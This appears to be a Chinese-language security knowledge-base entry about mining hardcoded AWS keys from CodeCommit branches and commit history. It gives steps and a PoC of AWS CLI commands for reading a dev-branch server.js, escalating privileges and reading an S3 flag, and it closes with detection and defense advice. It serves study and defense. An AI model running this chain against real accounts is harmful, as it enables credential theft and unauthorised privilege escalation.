---
id: cloud-cloud-iam-codecommit-branch-commit-history-secret-mining
title: CodeCommit 分支与提交历史挖掘硬编码 AK/SK：list-repositories/get-commit/get-differences/get-file 读取 dev 分支源码中的云凭据
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: codecommit-commit-history-secret-mining
aliases:
- CodeCommit 凭据挖掘
- aws codecommit get-file
- codecommit list-branches
- 提交历史硬编码 AK
- dev 分支凭据泄露
- server.js 硬编码 AWS key
tags:
- cloud
- aws
- codecommit
- iam
- credential-leak
- source-code
- git-history
- privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:37:01+08:00'
  notes: 已对照原文核对 list-repositories/list-branches/get-commit/get-differences/get-file 及 dev 分支 js/server.js 硬编码 AK/SK 链路；未在真实账号复现
---

## 一句话结论

当泄露的 AWS AK 具备 CodeCommit 读权限时，攻击者无需 clone 仓库即可用 `list-repositories`、`list-branches`、`get-commit`、`get-differences`、`get-file` 逐层枚举仓库、分支、提交说明与代码差异；开发者常把密钥从 master 删除却留在 dev 分支或历史提交里，本例即从 dev 分支的 `js/server.js` 中读到硬编码的 AWS AK/SK，配置后从 `prod-deploy` 提权到 `code-admin` 并读取 S3 flag。

## 原理

- **CodeCommit 是纯 API 仓库**：拥有 `codecommit:ListRepositories/ListBranches/GetBranch/GetCommit/GetDifferences/GetFile` 等读权限的主体，可以完全通过 AWS API 浏览源码和提交历史，不需要 git 凭据或网络访问代码托管界面。
- **权限与数据面**：入口 AK（如 `prod-deploy`）可能只被授予"部署相关"权限，但 `ListRepositories` 可直接列出账号内仓库；`GetCommit` 返回提交 message/author/parents；`GetDifferences` 给出两个 commit 之间新增/修改的文件与 blobId；`GetFile` 返回 base64 的 fileContent，解码即是源码。
- **泄露为何常见**：上线前把密钥从主分支删除、但 dev/feature 分支或历史 commit 仍保留；提交说明（如 "Allow S3 call to work universally"）会提示哪次提交改动与权限相关，帮助定位含凭据的文件。
- **提权为何成立**：不同分支/文件里可能存在不同用途、不同权限的长期密钥（部署用户 vs 代码管理员）；拿到更高权限的第二组 AK/SK 后即可访问 S3 等资源。

## 触发条件

- 已获得一组 AWS 凭据（来自镜像层/env/前端/其他泄露），且其策略允许 CodeCommit 读 API（哪怕只是列举）。
- 目标账号使用 CodeCommit 存放业务代码，且仓库分支/历史中存在硬编码凭据或配置文件。
- 泄露的次级凭据仍有效且权限更高。

## 利用步骤

1. `aws sts get-caller-identity` 确认当前身份；用 `enumerate-iam.py` 或直接尝试 `aws codecommit list-repositories` 确认 CodeCommit 读权限。
2. `aws codecommit get-repository --repository-name <repo>` 获取仓库信息与默认分支（本例 master）。
3. `aws codecommit list-branches --repository-name <repo>` 发现 `master` 与 `dev`；`get-branch` 取各分支最新 commitId。
4. `aws codecommit get-commit --repository-name <repo> --commit-id <dev-commit>` 阅读提交说明（如 "Allow S3 call to work universally"），并取 parents 作为对比基线。
5. `aws codecommit get-differences --repository-name <repo> --after-commit-specifier <dev> --before-commit-specifier <parent>` 查看新增/修改文件，定位 `js/server.js` 等可疑文件。
6. `aws codecommit get-file --repository-name <repo> --commit-specifier <dev> --file-path js/server.js` 读取内容，base64 解码后在 `AWS_ACCESS_KEY/SECRET_KEY` 常量处拿到新 AK/SK。
7. 配置新凭据，`aws sts get-caller-identity` 确认提权，读取 S3 中的 flag/业务数据；必要时继续对其它仓库重复该流程。

## PoC

```bash
aws sts get-caller-identity
aws codecommit list-repositories
aws codecommit get-repository --repository-name vessel-tracking
aws codecommit list-branches --repository-name vessel-tracking
aws codecommit get-branch --repository-name vessel-tracking --branch-name dev
aws codecommit get-commit --repository-name vessel-tracking --commit-id <dev-commit-id>
aws codecommit get-differences --repository-name vessel-tracking \
  --after-commit-specifier <dev-commit-id> --before-commit-specifier <parent-commit-id>
aws codecommit get-file --repository-name vessel-tracking \
  --commit-specifier <dev-commit-id> --file-path js/server.js
# 输出 fileContent 为 base64，解码后可见硬编码 AWS_ACCESS_KEY / AWS_SECRET_KEY
```

## 变体与关联

- 变体：配置 git-remote-codecommit 后直接 clone 全历史，用 `git log -p`/truffleHog 批量扫描；但 API 方式无需 git 环境、可在仅拿到 AK 时使用。
- 变体：对比所有分支与历史 commit，搜索 `AKIA`、`SECRET`、`.env`、`config` 等特征；也检查被删除文件的旧 blob。
- 关联：[[pentest-recon-github-repo-history-secret-mining]]（GitHub 仓库历史挖凭据）、[[cloud-container-image-config-history-secret-leak]]（镜像构建历史凭据）、[[cloud-cloud-iam-frontend-js-alibaba-ak-sk-cloud-takeover]]（前端源码凭据）。

## 检测与防御

- 在 CI 与提交钩子中集成 secret scanning（gitleaks/truffleHog），阻止含 `AKIA`/长期密钥的提交进入任何分支。
- 最小权限：部署/开发用户不授予跨仓库 `ListRepositories`、`GetFile` 等宽泛读权限；按仓库/分支收敛。
- 凭据治理：定期轮换；不在源码/配置中硬编码，改用角色/IAM Roles Anywhere/Secrets Manager；删除历史中的密钥并吊销。
- 检测：CloudTrail 监控 `GetFile`/`GetDifferences`/`ListBranches` 的高频或异常源 IP 调用，结合 `GetCallerIdentity` 后短时间内的权限提升行为。
